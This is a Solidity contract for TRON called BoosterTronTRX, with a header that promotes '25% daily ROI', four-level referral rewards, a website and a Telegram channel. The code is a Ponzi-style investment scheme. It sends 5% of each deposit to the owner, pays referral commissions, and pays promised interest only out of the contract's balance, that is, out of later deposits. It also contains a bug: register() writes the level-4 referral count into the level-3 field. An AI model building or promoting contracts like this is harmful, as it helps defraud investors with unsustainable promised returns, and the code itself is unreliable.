//SourceUnit: BoosterTronTRX.sol

pragma solidity ^0.4.25;

/*
______                     _                 _____                       __ _____ ______ __   ____  
| ___ \                   | |               |_   _|                     / /|_   _|| ___ \\ \ / /\ \ 
| |_/ /  ___    ___   ___ | |_   ___  _ __    | |   _ __   ___   _ __  | |   | |  | |_/ / \ V /  | |
| ___ \ / _ \  / _ \ / __|| __| / _ \| '__|   | |  | '__| / _ \ | '_ \ | |   | |  |    /  /   \  | |
| |_/ /| (_) || (_) |\__ \| |_ |  __/| |      | |  | |   | (_) || | | || |   | |  | |\ \ / /^\ \ | |
\____/  \___/  \___/ |___/ \__| \___||_|      \_/  |_|    \___/ |_| |_|| |   \_/  \_| \_|\/   \/ | |
                                                                        \_\                     /_/ 
                                                                                                    
                                                                                                    
------------------------------------
Crowdfunding & Crowdsharing project
 Website :  https://booster-tron.live/     
 Chanel :  https://t.me/BoosterTron     
------------------------------------ 
 CONTRACT MANAGEMENT:
------------------------------------
25% daily ROI FOR YOU 👨  
10% direct referral 👨  
3% referred level 2 👨🏽‍👨🏽‍  
1% referred level 3 👨🏽‍👨🏽‍👨🏽‍  
------------------------------------
Reinvest to generate compound interest
------------------------------------
*/

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}

contract BoosterTronTRX {

    using SafeMath for uint256;

    uint public totalPlayers;
    uint public totalPayout;
    uint public totalInvested;
    uint private minDeposit = 20000000;
    uint private interestRate = 1000000000000;
    uint public comDev = 5;
    uint public divisorFact = 100;
    uint private minuteRate = 2901608;
    uint private releaseTime = 1593702000;

    address owner;

    struct Player {
        uint trxDeposit;
        uint time;
        uint interestProfit;
        uint affRewards;
        uint payoutSum;
        address affFrom;
        uint256 aff1sum;
        uint256 aff2sum;
        uint256 aff3sum;
        uint256 aff4sum;
        
    }

    mapping(address => Player) public players;

    constructor() public {
      owner = msg.sender;
    }


    function register(address _addr, address _affAddr) private{

      Player storage player = players[_addr];

      player.affFrom = _affAddr;

      address _affAddr1 = _affAddr;
      address _affAddr2 = players[_affAddr1].affFrom;
      address _affAddr3 = players[_affAddr2].affFrom;
      address _affAddr4 = players[_affAddr3].affFrom;
   
      players[_affAddr1].aff1sum = players[_affAddr1].aff1sum.add(1);
      players[_affAddr2].aff2sum = players[_affAddr2].aff2sum.add(1);
      players[_affAddr3].aff3sum = players[_affAddr3].aff3sum.add(1);
      players[_affAddr4].aff3sum = players[_affAddr4].aff4sum.add(1);
      

    }

    function deposit(address _affAddr) public payable {
        require(now >= releaseTime, "not time yet!");
        
        collect(msg.sender);
        require(msg.value >= minDeposit);
        uint depositAmount = msg.value;

        Player storage player = players[msg.sender];

        if (player.time == 0) {
            player.time = now;
            totalPlayers++;
            if(_affAddr != address(0) && players[_affAddr].trxDeposit > 0){
              register(msg.sender, _affAddr);
            }
            else{
              register(msg.sender, owner);
            }
        }
        player.trxDeposit = player.trxDeposit.add(depositAmount);
       
        distributeRef(msg.value, player.affFrom);
        totalInvested = totalInvested.add(depositAmount);
        uint devEarn = depositAmount * comDev /divisorFact;

        owner.transfer(devEarn);
        
    }
   

    function withdraw() public {
        collect(msg.sender);
        require(players[msg.sender].interestProfit > 0);

        transferPayout(msg.sender, players[msg.sender].interestProfit);
    }

    function reinvest() public {
      collect(msg.sender);
      Player storage player = players[msg.sender];
      uint256 depositAmount = player.interestProfit;
      require(address(this).balance >= depositAmount);
      player.interestProfit = 0;
      player.trxDeposit = player.trxDeposit.add(depositAmount);
           
       distributeRef(depositAmount, player.affFrom);
        uint devEarn = depositAmount * comDev /divisorFact;
        owner.transfer(devEarn);
    }

    function collect(address _addr) internal {
        Player storage player = players[_addr];

        uint secPassed = now.sub(player.time);
        if (secPassed > 0 && player.time > 0) {
            uint collectProfit = (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRate);
            player.interestProfit = player.interestProfit.add(collectProfit);
            player.time = player.time.add(secPassed);
        }
    }

    function transferPayout(address _receiver, uint _amount) internal {
        if (_amount > 0 && _receiver != address(0)) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint payout = _amount > contractBalance ? contractBalance : _amount;
                totalPayout = totalPayout.add(payout);

                Player storage player = players[_receiver];
                player.payoutSum = player.payoutSum.add(payout);
                player.interestProfit = player.interestProfit.sub(payout);

                msg.sender.transfer(payout);
            }
        }
    }

    function distributeRef(uint256 _trx, address _affFrom) private{

        uint256 _allaff = (_trx.mul(10)).div(100);

        address _affAddr1 = _affFrom;
        address _affAddr2 = players[_affAddr1].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;
        address _affAddr4 = players[_affAddr3].affFrom;
       
        uint256 _affRewards = 0;

       if (_affAddr1 != address(0)) {
            _affRewards = (_trx.mul(10)).div(100);
            players[_affAddr1].affRewards = _affRewards.add(players[_affAddr1].affRewards);
            _affAddr1.transfer(_affRewards);
        }

        if (_affAddr2 != address(0)) {
            _affRewards = (_trx.mul(3)).div(100);
            players[_affAddr2].affRewards = _affRewards.add(players[_affAddr2].affRewards);
            _affAddr2.transfer(_affRewards);
        }
         if (_affAddr3 != address(0)) {
            _affRewards = (_trx.mul(1)).div(100);
            players[_affAddr3].affRewards = _affRewards.add(players[_affAddr3].affRewards);
            _affAddr3.transfer(_affRewards);
        }
         if (_affAddr4 != address(0)) {
            _affRewards = (_trx.mul(1)).div(100);
            players[_affAddr4].affRewards = _affRewards.add(players[_affAddr4].affRewards);
            _affAddr4.transfer(_affRewards);
        }



    }

    function getProfit(address _addr) public view returns (uint) {
      address playerAddress= _addr;
      Player storage player = players[playerAddress];
      require(player.time > 0);

      uint secPassed = now.sub(player.time);
      if (secPassed > 0) {
          uint collectProfit = (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRate);
      }
      return collectProfit.add(player.interestProfit);
    }
  
}